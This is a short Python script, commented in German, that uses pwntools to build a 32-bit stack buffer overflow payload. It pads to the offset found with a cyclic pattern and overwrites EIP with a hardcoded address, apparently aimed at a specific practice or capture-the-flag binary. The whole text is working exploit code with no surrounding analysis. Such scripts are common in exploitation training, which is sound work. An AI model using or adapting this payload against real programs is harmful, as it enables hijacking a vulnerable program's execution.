from pwn import *
# eip = 32 Bit System rip = 64 Bit
# kleines Pythonskript, das eine Bufferoverflow Schwachstelle ausnutzt.
padding = cyclic(cyclic_find('jaaa')) # Padding bis festgelegten String, der in EIP steht
eip = p32(0x08048536)
payload = padding + eip

print(payload)

